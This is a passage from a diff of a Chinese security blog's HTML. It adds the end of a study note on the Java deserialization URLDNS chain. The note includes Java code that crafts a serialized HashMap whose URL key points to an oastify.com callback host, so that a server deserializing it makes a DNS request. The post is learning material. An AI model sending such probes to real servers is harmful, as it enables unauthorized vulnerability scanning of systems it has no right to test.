+<p>这里的 key 以及 value 是从 table 中取的(table是 HashMap 类的一个成员变量，是整个哈希表的底层存储容器)，具体实现：<code>transient Node&lt;K,V&gt;[] table;</code> </p>
+<p>而想要修改table的值，就需要调用 HashMap#put 方法，定位到它：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里也调用了<code>hash</code>方法，根据上面所分析的调用链即可发现这里就会产生第一次 DNS 请求。</p>
+<p>这里我们仔细思考一下，在第一次put一个URL对象时，会调用这个URL对象的 hashCode 方法，这样我们的hashCode 属性就不为-1，同时，由于我们是在本地构造的，所以在第一次发起 DNS 请求时是由我们本地发起的，并不是由服务器发起的。同时，由于此时我们URL对象的 hashCode 属性已经不为-1，即使上传到服务器上，也不会进行 DNS 请求。</p>
+<p>为了避免由我们本地发起的请求被我们误认为是服务器发起的，我们需要用反射进行修改 hashCode 属性，这里给一下样例：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://q3uh4dntflrkvpsqhn1ka1po7fd61wpl.oastify.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; u = url.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> u.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashCode.set(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">hashCode.set(url,-<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>这样我们序列化之后得到的 hashCode 属性还是-1，当我们上传到服务器上时，反序列化就会进行 put 操作，从而发起 DNS 请求。</p>
+<p>现在来总结一下 URLDNS 链的调用过程，我们在本地构造一个 HashMap 对象，序列化之后上传到服务器，服务器在反序列化时一定会触发 HashMap 的 readObject 方法（因为在 JVM 中，<code>ois.readObject()</code>发现这是一个 HashMap 对象后，会新建一个 HashMap 对象并调用它的 readObject 方法来反序列化我们上传的字节流），然后触发 hash 方法中的 key 的 hashCode 方法，也就是 URL 对象的 hashCode 方法，在 URL 对象的 hashCode 方法中会触发一个 URLStreamHandler 对象的 hashCode 方法，从而触发内部的 getHostAddress 方法，发起 DNS 请求。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>URLDNS链是 java 反序列化中非常基础的调用链，这里我花了将近两个晚上来彻底弄明白它的原理，其实是有点慢的，但是我觉得慢没关系，搞懂才是最重要的，希望以后在学习其他调用链时能够更加得心应手。</p>
 
 		</div>
 
@@ -533,18 +568,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Jinja2常见关键字被ban后的SSTI</li>
+        <li><strong>Title:</strong> java反序列化之URLDNS链</li>
         <li><strong>Author:</strong> SoloWalker</li>
         <li><strong>Created at
-                :</strong> 2026-04-11 00:00:00</li>
+                :</strong> 2026-04-21 00:00:00</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2026-04-11 17:58:18
+                    :</strong> 2026-04-23 20:54:33
             </li>
         
         <li>
-            <strong>Link:</strong> https://s0lowalker.github.io/2026/04/11/Jinja2模板下非常见的SSTI/
+            <strong>Link:</strong> https://s0lowalker.github.io/2026/04/21/java反序列化之URLDNS链/
         </li>
         <li>
             <strong>
@@ -566,7 +601,7 @@
 		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">#复现笔记</a>&nbsp;
+				<a href="/tags/java%E5%AE%89%E5%85%A8/">#java安全</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -577,23 +612,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2026/04/18/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">PHP文件上传不含PHP代码实现RCE的方法</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2026/04/11/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84SSTI/">
+				<a class="next" rel="next" href="/2026/04/18/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">SSTI之twig</span>
+						<span class="post-nav-title-item truncate max-w-48">PHP文件上传不含PHP代码实现RCE的方法</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -676,8 +699,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">Jinja2常见关键字被ban后的SSTI</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Jinja2%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%ABban%E5%90%8E%E7%9A%84SSTI"><span class="nav-text">Jinja2常见关键字被ban后的SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="nav-text">题目源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E8%AE%B2%E8%A7%A3"><span class="nav-text">payload讲解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E6%98%BE"><span class="nav-text">回显</span></a></li></ol></li></ol>
+		<div class="page-title">java反序列化之URLDNS链</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E9%93%BE"><span class="nav-text">java反序列化之URLDNS链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">java反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URLDNS%E9%93%BE"><span class="nav-text">URLDNS链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol>
 
 	</div>
 </div>
